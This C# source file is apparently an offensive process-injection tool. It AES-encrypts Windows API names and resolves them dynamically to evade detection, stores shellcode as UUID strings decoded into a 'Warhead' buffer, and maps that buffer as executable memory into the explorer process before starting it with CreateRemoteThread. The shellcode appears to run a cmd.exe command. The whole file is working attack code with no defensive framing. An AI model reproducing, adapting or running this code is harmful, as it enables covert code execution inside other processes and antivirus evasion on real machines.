using System;
using System.Diagnostics;
using System.IO;
using System.Reflection;
using System.Reflection.Emit;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;

namespace UUID_Process_Injection_Dynamic_Invoke_Alternate
{
    class Program
    {

        static string GlobalKey = "uW2VRiWpxGFDLezetodQmXoq4MZDMmEStd1egJRKMDM=";
        static string GlobalIV = "3GSSSrPRO4taOe/x+BRMFA==";

        static byte[] dKernel32_dll_Bytes = new byte[16] { 0xCE, 0xA1, 0x86, 0xB8, 0xA9, 0x30, 0x18, 0xA0, 0x98, 0x0A, 0x45, 0x86, 0x7C, 0x59, 0xDA, 0x91 };
        static string dKernel32_dll = DecryptAESAsString(dKernel32_dll_Bytes, GlobalKey, GlobalIV);

        static byte[] dntdll_dll_Bytes = new byte[16] { 0x67, 0x0D, 0xC4, 0x9A, 0xA1, 0x11, 0x6A, 0x29, 0x8B, 0x20, 0x54, 0xA8, 0x55, 0xF3, 0xA1, 0xBD };
        static string dntdll_dll = DecryptAESAsString(dntdll_dll_Bytes, GlobalKey, GlobalIV);

        static byte[] dOpenProcess_Bytes = new byte[16] { 0x81, 0xE2, 0x71, 0x9F, 0xC2, 0x72, 0xA0, 0x02, 0x20, 0xCA, 0x43, 0x55, 0x00, 0xF0, 0xE2, 0xDB };
        static string dOpenProcess = DecryptAESAsString(dOpenProcess_Bytes, GlobalKey, GlobalIV);

        static byte[] dCreateRemoteThread_Bytes = new byte[32] { 0x7C, 0x0E, 0xCE, 0xED, 0x74, 0xE1, 0xC8, 0x74, 0x4A, 0xD2, 0x7F, 0xF4, 0xF2, 0xAC, 0xED, 0xF8, 0xCD, 0xEA, 0xC3, 0x23, 0x75, 0x71, 0x06, 0x15, 0x6A, 0x69, 0x86, 0x4C, 0x81, 0x48, 0x5F, 0x66 };
        static string dCreateRemoteThread = DecryptAESAsString(dCreateRemoteThread_Bytes, GlobalKey, GlobalIV);

        static byte[] dNtClose_Bytes = new byte[16] { 0x34, 0x8D, 0x64, 0x03, 0x5B, 0x0F, 0x42, 0xA0, 0x60, 0xCD, 0x0B, 0x6F, 0x36, 0x7C, 0xD8, 0xC1 };
        static string dNtClose = DecryptAESAsString(dNtClose_Bytes, GlobalKey, GlobalIV);

        static byte[] dNtCreateSection_Bytes = new byte[16] { 0x75, 0xED, 0x19, 0xF9, 0x92, 0x4E, 0x80, 0xB1, 0xAF, 0xE4, 0x26, 0x9E, 0xB9, 0xCB, 0x32, 0x8A };
        static string dNtCreateSection = DecryptAESAsString(dNtCreateSection_Bytes, GlobalKey, GlobalIV);

        static byte[] dNtMapViewOfSection_Bytes = new byte[32] { 0x4A, 0x7B, 0x7B, 0x71, 0x8F, 0x02, 0x5D, 0x59, 0x0A, 0x03, 0xF9, 0x8E, 0xE8, 0x32, 0x5E, 0xF4, 0x8F, 0x3C, 0x1D, 0x32, 0xC0, 0x92, 0x94, 0xA9, 0x5B, 0xF7, 0xB0, 0x35, 0x70, 0x98, 0x8B, 0x9F };
        static string dNtMapViewOfSection = DecryptAESAsString(dNtMapViewOfSection_Bytes, GlobalKey, GlobalIV);

        static byte[] dNtUnmapViewOfSection_Bytes = new byte[32] { 0x81, 0xC1, 0xB2, 0xEE, 0x67, 0x4E, 0x63, 0xC6, 0x24, 0x27, 0xBF, 0xD0, 0x81, 0xB5, 0x78, 0x54, 0xD3, 0xEF, 0x44, 0x2B, 0xD9, 0xD3, 0xEC, 0x25, 0xF4, 0x2F, 0x37, 0x8A, 0x68, 0x30, 0xB3, 0x3C };
        static string dNtUnmapViewOfSection = DecryptAESAsString(dNtUnmapViewOfSection_Bytes, GlobalKey, GlobalIV);


        public static object DynamicInvoke(Type returnType, string library, string methodName, object[] argumentTypes, Type[] parameterTypes)
        {
            var assemblyName = new AssemblyName("DynamicAssembly");
            var assemblyBuilder = AppDomain.CurrentDomain.DefineDynamicAssembly(assemblyName, AssemblyBuilderAccess.Run);
            var moduleBuilder = assemblyBuilder.DefineDynamicModule("DynamicModule");

            var methodBuilder = moduleBuilder.DefinePInvokeMethod(
                methodName,
                library,
                MethodAttributes.Public | MethodAttributes.Static | MethodAttributes.PinvokeImpl,
                CallingConventions.Standard,
                returnType,
                parameterTypes,
                CallingConvention.Winapi,
                CharSet.Ansi
            );

            methodBuilder.SetImplementationFlags(methodBuilder.GetMethodImplementationFlags() | MethodImplAttributes.PreserveSig);
            moduleBuilder.CreateGlobalFunctions();
            MethodInfo dynamicMethod = moduleBuilder.GetMethod(methodName);

            return dynamicMethod.Invoke(null, argumentTypes);
        }
        public static IntPtr fOpenProcess(uint processAccess, bool bInheritHandle, uint processId)
        {
            var paramterTypes = new Type[] { typeof(uint), typeof(bool), typeof(uint) };
            var argumentTypes = new object[] { processAccess, bInheritHandle, processId };
            return (IntPtr)DynamicInvoke(typeof(IntPtr), dKernel32_dll, dOpenProcess, argumentTypes, paramterTypes);
        }

        public static IntPtr fCreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId)
        {
            var paramterTypes = new Type[] { typeof(IntPtr), typeof(IntPtr), typeof(uint), typeof(IntPtr), typeof(IntPtr), typeof(uint), typeof(IntPtr) };
            var argumentTypes = new object[] { hProcess, lpThreadAttributes, dwStackSize, lpStartAddress, lpParameter, dwCreationFlags, lpThreadId };
            return (IntPtr)DynamicInvoke(typeof(IntPtr), dKernel32_dll, dCreateRemoteThread, argumentTypes, paramterTypes);
        }

        public static UInt32 fNtCreateSection(ref IntPtr section, UInt32 desiredAccess, IntPtr pAttrs, ref long MaxSize, uint pageProt, uint allocationAttribs, IntPtr hFile)
        {
            var parameterTypes = new Type[] { typeof(IntPtr).MakeByRefType(), typeof(UInt32), typeof(IntPtr), typeof(long).MakeByRefType(), typeof(UInt32), typeof(UInt32), typeof(IntPtr) };
            var argumentTypes = new object[] { section, desiredAccess, pAttrs, MaxSize, pageProt, allocationAttribs, hFile };
            UInt32 result = (UInt32)DynamicInvoke(typeof(UInt32), dntdll_dll, dNtCreateSection, argumentTypes, parameterTypes);

            section = (IntPtr)argumentTypes[0];
            MaxSize = (long)argumentTypes[3];

            return result;
        }

        public static UInt32 fNtMapViewOfSection(IntPtr SectionHandle, IntPtr ProcessHandle, ref IntPtr BaseAddress, IntPtr ZeroBits, IntPtr CommitSize, ref long SectionOffset, ref long ViewSize, uint InheritDisposition, uint AllocationType, uint Win32Protect)
        {
            var parameterTypes = new Type[] { typeof(IntPtr), typeof(IntPtr), typeof(IntPtr).MakeByRefType(), typeof(IntPtr), typeof(IntPtr), typeof(long).MakeByRefType(), typeof(long).MakeByRefType(), typeof(uint), typeof(uint), typeof(uint) };
            var argumentTypes = new object[] { SectionHandle, ProcessHandle, BaseAddress, ZeroBits, CommitSize, SectionOffset, ViewSize, InheritDisposition, AllocationType, Win32Protect };
            UInt32 result = (UInt32)DynamicInvoke(typeof(UInt32), dntdll_dll, dNtMapViewOfSection, argumentTypes, parameterTypes);

            BaseAddress = (IntPtr)argumentTypes[2];
            SectionOffset = (long)argumentTypes[5];
            ViewSize = (long)argumentTypes[6];

            return result;
        }

        public static uint fNtUnmapViewOfSection(IntPtr hProc, IntPtr baseAddr)
        {
            var parameterTypes = new Type[] { typeof(IntPtr), typeof(IntPtr) };
            var argumentTypes = new object[] { hProc, baseAddr };
            return (uint)DynamicInvoke(typeof(uint), dntdll_dll, dNtUnmapViewOfSection, argumentTypes, parameterTypes);
        }

        public static int fNtClose(IntPtr hObject)
        {
            var parameterTypes = new Type[] { typeof(IntPtr) };
            var argumentTypes = new object[] { hObject };
            return (int)DynamicInvoke(typeof(int), dntdll_dll, dNtClose, argumentTypes, parameterTypes);
        }
        static int Main(string[] args)
        {

            string[] uuids = {

                "e48348fc-e8f0-00c0-0000-415141505251",
                "d2314856-4865-528b-6048-8b5218488b52",
                "728b4820-4850-b70f-4a4a-4d31c94831c0",
                "7c613cac-2c02-4120-c1c9-0d4101c1e2ed",
                "48514152-528b-8b20-423c-4801d08b8088",
                "48000000-c085-6774-4801-d0508b481844",
                "4920408b-d001-56e3-48ff-c9418b348848",
                "314dd601-48c9-c031-ac41-c1c90d4101c1",
                "f175e038-034c-244c-0845-39d175d85844",
                "4924408b-d001-4166-8b0c-48448b401c49",
                "8b41d001-8804-0148-d041-5841585e595a",
                "59415841-5a41-8348-ec20-4152ffe05841",
                "8b485a59-e912-ff57-ffff-5d48ba010000",
                "00000000-4800-8d8d-0101-000041ba318b",
                "d5ff876f-f0bb-a2b5-5641-baa695bd9dff",
                "c48348d5-3c28-7c06-0a80-fbe07505bb47",
                "6a6f7213-5900-8941-daff-d5636d642e65",
                "2f206578-206b-7069-636f-6e666967202f",
                "006c6c61-9090-9090-9090-909090909090",

            };

            byte[] Warhead = new byte[uuids.Length * 16];
            for (int i = 0; i < uuids.Length; i++)
            {
                Guid guid = Guid.Parse(uuids[i]);
                byte[] guidBytes = guid.ToByteArray();
                Buffer.BlockCopy(guidBytes, 0, Warhead, i * 16, 16);
            }

            long buffer_size = Warhead.Length;

            IntPtr ptr_section_handle = IntPtr.Zero;
            UInt32 create_section_status = fNtCreateSection(ref ptr_section_handle, 0xe, IntPtr.Zero, ref buffer_size, 0x40, 0x08000000, IntPtr.Zero);

            long local_section_offset = 0;
            IntPtr ptr_local_section_addr = IntPtr.Zero;
            IntPtr localProcess = new IntPtr(-1);
            UInt32 local_map_view_status = fNtMapViewOfSection(ptr_section_handle, localProcess, ref ptr_local_section_addr, IntPtr.Zero, IntPtr.Zero, ref local_section_offset, ref buffer_size, 0x2, 0, 0x04);


            Marshal.Copy(Warhead, 0, ptr_local_section_addr, Warhead.Length);

            var process = Process.GetProcessesByName("explorer")[0];
            IntPtr hProcess = fOpenProcess(0x001F0FFF, false, (uint)process.Id);
            IntPtr ptr_remote_section_addr = IntPtr.Zero;
            UInt32 remote_map_view_status = fNtMapViewOfSection(ptr_section_handle, hProcess, ref ptr_remote_section_addr, IntPtr.Zero, IntPtr.Zero, ref local_section_offset, ref buffer_size, 0x2, 0, 0x20);

            fNtUnmapViewOfSection(localProcess, ptr_local_section_addr);
            fNtClose(ptr_section_handle);

            fCreateRemoteThread(hProcess, IntPtr.Zero, 0, ptr_remote_section_addr, IntPtr.Zero, 0, IntPtr.Zero);

            return 0;
        }

        static string DecryptAESAsString(byte[] data, string keyBase64, string ivBase64)
        {
            byte[] decryptedBytes = DecryptAESAsBytes(data, keyBase64, ivBase64);
            return Encoding.UTF8.GetString(decryptedBytes);
        }

        static byte[] DecryptAESAsBytes(byte[] data, string keyBase64, string ivBase64)
        {
            byte[] key = Convert.FromBase64String(keyBase64);
            byte[] iv = Convert.FromBase64String(ivBase64);

            using (Aes aes = Aes.Create())
            {
                aes.Key = key;
                aes.IV = iv;

                using (ICryptoTransform decryptor = aes.CreateDecryptor(aes.Key, aes.IV))
                using (MemoryStream memoryStream = new MemoryStream(data))
                using (CryptoStream cryptoStream = new CryptoStream(memoryStream, decryptor, CryptoStreamMode.Read))
                {

                    byte[] decryptedBytes = new byte[data.Length];
                    int decryptedByteCount = cryptoStream.Read(decryptedBytes, 0, decryptedBytes.Length);

                    byte[] result = new byte[decryptedByteCount];
                    Array.Copy(decryptedBytes, result, decryptedByteCount);
                    return result;
                }
            }
        }
    }
}
